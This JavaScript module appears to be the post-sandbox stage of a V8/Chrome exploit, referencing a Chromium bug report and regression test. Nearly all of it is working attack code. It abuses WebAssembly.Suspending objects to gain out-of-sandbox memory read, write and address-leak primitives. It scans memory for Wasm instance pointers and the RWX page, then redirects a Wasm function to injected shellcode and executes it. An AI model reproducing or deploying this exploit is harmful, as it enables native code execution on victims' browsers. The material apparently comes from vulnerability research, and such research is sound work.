// PASTE RESEARCHER'S post.mjs CONTENT BELOW THIS LINE
// https://crbug.com/432289371
// https://chromium.googlesource.com/v8/v8.git/+/refs/heads/main/test/mjsunit/sandbox/regress-432289371.js

let postOffsets = {
    defArgCount: 32,
    leakReturnIndex: 0,

    trustedInstanceInstanceOffset: 0x80n, // offset to caged Instance object from a trusted Instance object
    trustedInstanceRWXOffset: 0x30, // offset to RWX page from a trusted Instance object
}

let targetInstance = wasmShellcodeLoader(wasmShellcode).instantiate();
let dummyInstance = wasmShellcodeLoader(wasmShellcode, new WasmModuleBuilder(), 0xeeeeeeeeeeeeeeeen).instantiate();

async function primitiveFactory(offsets, primitives) {
    function foo() {} // for WebAssembly.Suspending

    let builder = new WasmModuleBuilder();
    let struct1 = builder.addStruct([makeField(kWasmI64, true)]);

    builder.addFunction('createStruct', makeSig([], [wasmRefType(struct1)])) // for testing
    .addBody([
        kGCPrefix, kExprStructNewDefault, struct1
    ]).exportFunc();

    builder.addFunction('leak', makeSig(new Array(offsets.defArgCount).fill(kWasmI64), [])) // index 1
    .addBody([
        // ...new Array(offsets.defArgCount).fill(kExprLocalGet).flatMap((v, i) => [v, i]),
    ]).exportFunc()

    builder.addFunction('dummyLeak', makeSig([], new Array(offsets.defArgCount).fill(kWasmI64))) // index 2
    .addBody([
        ... new Array(offsets.defArgCount).fill(0).flatMap((v, i) => [
            kExprI64Const, 0,
        ]),
    ]).exportFunc();

    builder.addFunction('write', makeSig([wasmRefType(struct1), kWasmI64], [])) // index 3
    .addBody([
        kExprLocalGet, 0,
        kExprLocalGet, 1,
        kGCPrefix, kExprStructSet, struct1, 0
    ]).exportFunc();

    builder.addFunction('dummyWrite', makeSig([kWasmI64, kWasmI64], [])) // index 4
    .addBody([
    ]).exportFunc();

    builder.addFunction('read', makeSig([wasmRefType(struct1)], [kWasmI64])) // index 5
    .addBody([
        kExprLocalGet, 0,
        kGCPrefix, kExprStructGet, struct1, 0
    ]).exportFunc();

    builder.addFunction('dummyRead', makeSig([kWasmI64], [kWasmI64])) // index 6
    .addBody([
        kExprI64Const, 0,
    ]).exportFunc();

    builder.addFunction('addrOf', makeSig([kWasmI64], [kWasmI64])) // index 7
    .addBody([
        kExprLocalGet, 0,
    ]).exportFunc();

    builder.addFunction('dummyAddrOf', makeSig([kWasmAnyRef], [kWasmI64])) // index 8
    .addBody([
        kExprI64Const, 0,
    ]).exportFunc();

    let instance = builder.instantiate()

    instance.exports.leak(...new Array(offsets.defArgCount).fill(1n));
    instance.exports.write(instance.exports.createStruct(), 0x1n);
    instance.exports.read(instance.exports.createStruct());
    instance.exports.addrOf(123n);

    // Setup WebAssembly.Suspending objects
    let leakSuspending = new WebAssembly.Suspending(foo);
    let writeSuspending = new WebAssembly.Suspending(foo);
    let readSuspending = new WebAssembly.Suspending(foo);
    let addrOfSuspending = new WebAssembly.Suspending(foo);
    primitives.cagedWrite32(primitives.addrOf(leakSuspending) + 0xbn, primitives.addrOf(instance.exports.leak));
    primitives.cagedWrite32(primitives.addrOf(writeSuspending) + 0xbn, primitives.addrOf(instance.exports.write));
    primitives.cagedWrite32(primitives.addrOf(readSuspending) + 0xbn, primitives.addrOf(instance.exports.read));
    primitives.cagedWrite32(primitives.addrOf(addrOfSuspending) + 0xbn, primitives.addrOf(instance.exports.addrOf));

    let builder2 = new WasmModuleBuilder();
    let struct2 = builder2.addStruct([makeField(kWasmI64, true)]);
    
    let leakType = builder2.addType(makeSig(new Array(offsets.defArgCount).fill(kWasmI64), []));
    let writeType = builder2.addType(makeSig([wasmRefType(struct2), kWasmI64], []));
    let readType = builder2.addType(makeSig([wasmRefType(struct2)], [kWasmI64]));
    let addrOfType = builder2.addType(makeSig([kWasmI64], [kWasmI64]));

    builder2.addImport('js', 'skip', writeType);
    builder2.addImport('js', 'skip', writeType);
    let importLeakIdx = builder2.addImport('js', 'leak', leakType); // use func type of index 2 (dummyLeak)
    builder2.addImport('js', 'skip', writeType);
    let importWriteIdx = builder2.addImport('js', 'write', writeType); // use func type of index 4 (dummyWrite)
    builder2.addImport('js', 'skip', writeType);
    let importReadIdx = builder2.addImport('js', 'read', readType); // use func type of index 6 (dummyRead)
    builder2.addImport('js', 'skip', writeType);
    let importAddrOfIdx = builder2.addImport('js', 'addrOf', addrOfType); // use func type of index 8 (dummyAddrOf) 

    builder2.addTable(kWasmFuncRef, 1, 1, [kExprRefFunc, importLeakIdx]);
    builder2.addTable(kWasmFuncRef, 1, 1, [kExprRefFunc, importWriteIdx]);
    builder2.addTable(kWasmFuncRef, 1, 1, [kExprRefFunc, importReadIdx]);
    builder2.addTable(kWasmFuncRef, 1, 1, [kExprRefFunc, importAddrOfIdx]);

    builder2.addFunction('accessLeak', makeSig([], [kWasmFuncRef]))
    .addBody([
        kExprRefFunc, importLeakIdx,
    ]).exportFunc();
    builder2.addFunction('accessWrite', makeSig([], [kWasmFuncRef]))
    .addBody([
        kExprRefFunc, importWriteIdx,
    ]).exportFunc();
    builder2.addFunction('accessRead', makeSig([], [kWasmFuncRef]))
    .addBody([
        kExprRefFunc, importReadIdx,
    ]).exportFunc();
    builder2.addFunction('accessAddrOf', makeSig([], [kWasmFuncRef]))
    .addBody([
        kExprRefFunc, importAddrOfIdx,
    ]).exportFunc();


    let instance2 = builder2.instantiate({js: {skip: () => {}, leak: leakSuspending, write: writeSuspending, read: readSuspending, addrOf: addrOfSuspending}});
    let leakFunc = instance2.exports.accessLeak()
    let writeFunc = instance2.exports.accessWrite()
    let readFunc = instance2.exports.accessRead()
    let addrOfFunc = instance2.exports.accessAddrOf()

    let baseAddr = addrOfFunc({}) & 0xffffffff00000000n;

    await console.log('Scanning for trusted address...');

    // This is very vibes based, but seems to work locally
    // Scan any leaked stack addresses for pointers to trusted objects
    let counts = new Map();
    let vals = leakFunc();
    for (let val of vals) {
        if ((val & 0xfffff00000000000n) != 0x0000700000000000n) continue;
        if ((val & 0x00000000ffff0000n) == 0n) continue
        if ((val & 0x7n) != 0n) continue; // Skip non qword aligned addresses
        await console.log(to_hex(val));

        for (let x = 0; x < 4096; x+= 8) {
            let addr = val + BigInt(x);
            let v = readFunc(addr - 7n);
            if ((v & 0xffffffff00000000n) == 0n) continue; // Skip non addresses
            if ((v & 0xffff000000000000n) != 0n) continue; // Skip non addresses
            if ((v & 0xffffffff00000000n) == baseAddr) continue; // Skip addresses in the v8 cage
            if ((v & 0xfffff00000000000n) == (0x0000500000000000n)) continue; // Skip Chrome executable addresses
            if ((v & 0xfffff00000000000n) == (0x0000700000000000n)) continue; // Skip stack addresses
            if (![0x1n, 0x5n, 0x9n, 0xdn].includes(v & 0xfn)) continue; // Skip non object addresses
            if ((v & 0x0000000000f00000n) != 0x0000000000100000n) continue; // Skip unlikely trusted addresses

            // TODO: Exclude caged addresses

            let _v = v & 0xffffffff00000000n;
            if (!counts.has(_v)) counts.set(_v, []);
            counts.get(_v).push(v);
        }
    }

    let trustedAddr, countMax = 0;
    for (let [val, elements] of counts) {
        // Added for Google
        // if (elements.length == 4) {
        //     trustedAddr = elements[0];
        //     break;
        // }
        if (elements.length > countMax) {
            countMax = elements.length;
            trustedAddr = elements[0];
        }
        await console.log('Count', to_hex(val), elements.length, elements.slice(0, 5).map(i => to_hex(i)).join(', '));
    }
    

    return {
        trustedAddr,
        memRead: (addr) => readFunc(addr - 7n),
        memWrite: (addr, value) => writeFunc(value, addr -7n),
    }
}

export async function execute(version_hint, primitives) {
    await console.log(`Using post Wasm_SuspendingObjectCallable`);

    let offsets = init(postOffsets, version_hint);
    let {trustedAddr, memRead, memWrite} = await primitiveFactory(offsets, primitives);

    await console.log('Trusted addr:', to_hex(trustedAddr));

    let targetInstanceTrustedAddr, dummyInstanceTrustedAddr;
    let needle = primitives.addrOf(targetInstance);
    for (let addr = 0n; true; addr += 4n) {
        let _addr = (trustedAddr - 1n) - addr;
        let val = memRead(_addr);
        if ((val & 0xffffffffn) == needle) {
            targetInstanceTrustedAddr = _addr - BigInt(offsets.trustedInstanceInstanceOffset);
            break;
        }
    }
    await console.log('TargetInstance trusted address:', to_hex(targetInstanceTrustedAddr));

    needle = primitives.addrOf(dummyInstance);
    for (let addr = 0n; true; addr += 4n) {
        let _addr = targetInstanceTrustedAddr + addr;
        let val = memRead(_addr);
        if ((val & 0xffffffffn) == needle) {
            dummyInstanceTrustedAddr = _addr - BigInt(offsets.trustedInstanceInstanceOffset);
            break;
        }
    }
    await console.log('DummyInstance trusted address:', to_hex(dummyInstanceTrustedAddr));

    let rwxAddr = memRead(dummyInstanceTrustedAddr + BigInt(offsets.trustedInstanceRWXOffset));
    await console.log('RWX addr:', to_hex(rwxAddr), to_hex(memRead(rwxAddr)));

    let shellcodeOffset;
    // Trigger the lazy compilation of the shellcode generator function then search for the offset to the nop sled
    dummyInstance.exports.shellcode("");
    for (let x = 0; true; x += 4) {
        let d = memRead(rwxAddr + BigInt(x));
        if ((d & 0xffffn) == 0x9090n) {
            shellcodeOffset = x;
            break;
        }
        if (((d >> 32n) & 0xffffn) == 0x9090n) {
            shellcodeOffset = x + 4;
            break;
        }
    }
    await console.log("Shellcode offset:", to_hex(shellcodeOffset));

    memWrite(targetInstanceTrustedAddr + BigInt(offsets.trustedInstanceRWXOffset), memRead(dummyInstanceTrustedAddr + BigInt(offsets.trustedInstanceRWXOffset)) + BigInt(shellcodeOffset));

    await console.log('Executing shellcode...');

    let iomem = new Array(8192).fill('\0').join('');
    await console.log(`Result:`, Number(targetInstance.exports.shellcode(iomem)));
    await console.log(cleanShellcodeOutput(iomem));
}
